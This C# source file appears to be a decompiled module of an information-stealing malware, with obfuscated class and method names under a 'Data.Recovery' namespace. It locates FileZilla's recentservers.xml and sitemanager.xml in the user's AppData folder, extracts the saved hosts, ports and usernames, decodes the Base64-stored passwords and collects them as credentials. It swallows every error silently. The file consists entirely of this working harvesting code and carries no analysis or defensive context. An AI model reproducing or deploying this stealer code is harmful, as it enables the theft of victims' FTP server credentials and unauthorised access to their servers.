using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

namespace NoiseMe.Drags.App.Data.Recovery
{
	public class gg3d : GH9kf<FtpCredential>
	{
		public List<FtpCredential> EnumerateData()
		{
			List<FtpCredential> list = new List<FtpCredential>();
			try
			{
				string path = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\FileZilla\\recentservers.xml";
				string path2 = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\FileZilla\\sitemanager.xml";
				if (File.Exists(path))
				{
					list.AddRange(FFFTp(path));
				}
				if (File.Exists(path2))
				{
					list.AddRange(FFFTp(path2));
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		public static List<FtpCredential> FFFTp(string Path)
		{
			List<FtpCredential> list = new List<FtpCredential>();
			try
			{
				XmlTextReader reader = new XmlTextReader(Path);
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(reader);
				foreach (XmlNode childNode in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
				{
					FtpCredential ftpCredential = Rcnt(childNode);
					if (ftpCredential.Username != "UNKNOWN" && ftpCredential.Server != "UNKNOWN")
					{
						list.Add(ftpCredential);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		public static FtpCredential Rcnt(XmlNode xmlNode)
		{
			FtpCredential ftpCredential = new FtpCredential();
			try
			{
				foreach (XmlNode childNode in xmlNode.ChildNodes)
				{
					if (childNode.Name == "Host")
					{
						ftpCredential.Server = childNode.InnerText;
					}
					if (childNode.Name == "Port")
					{
						ftpCredential.Server = ftpCredential.Server + ":" + childNode.InnerText;
					}
					if (childNode.Name == "User")
					{
						ftpCredential.Username = childNode.InnerText;
					}
					if (childNode.Name == "Pass")
					{
						ftpCredential.Password = Base64Decode(childNode.InnerText);
					}
				}
				return ftpCredential;
			}
			catch
			{
				return ftpCredential;
			}
			finally
			{
				ftpCredential.Username = (string.IsNullOrEmpty(ftpCredential.Username) ? "UNKNOWN" : ftpCredential.Username);
				ftpCredential.Server = (string.IsNullOrEmpty(ftpCredential.Server) ? "UNKNOWN" : ftpCredential.Server);
				ftpCredential.Password = (string.IsNullOrEmpty(ftpCredential.Password) ? "UNKNOWN" : ftpCredential.Password);
			}
		}

		public static FtpCredential MngCred(XmlNode xmlNode)
		{
			FtpCredential ftpCredential = new FtpCredential();
			try
			{
				foreach (XmlNode childNode in xmlNode.ChildNodes)
				{
					if (childNode.Name == "Host")
					{
						ftpCredential.Server = childNode.InnerText;
					}
					if (childNode.Name == "Port")
					{
						ftpCredential.Server = ftpCredential.Server + ":" + childNode.InnerText;
					}
					if (childNode.Name == "User")
					{
						ftpCredential.Username = childNode.InnerText;
					}
					if (childNode.Name == "Pass")
					{
						ftpCredential.Password = Base64Decode(childNode.InnerText);
					}
				}
				return ftpCredential;
			}
			catch
			{
				return ftpCredential;
			}
			finally
			{
				ftpCredential.Username = (string.IsNullOrEmpty(ftpCredential.Username) ? "UNKNOWN" : ftpCredential.Username);
				ftpCredential.Server = (string.IsNullOrEmpty(ftpCredential.Server) ? "UNKNOWN" : ftpCredential.Server);
				ftpCredential.Password = (string.IsNullOrEmpty(ftpCredential.Password) ? "UNKNOWN" : ftpCredential.Password);
			}
		}

		public static string Base64Decode(string input)
		{
			try
			{
				byte[] bytes = Convert.FromBase64String(input);
				return Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				return input;
			}
		}
	}
}
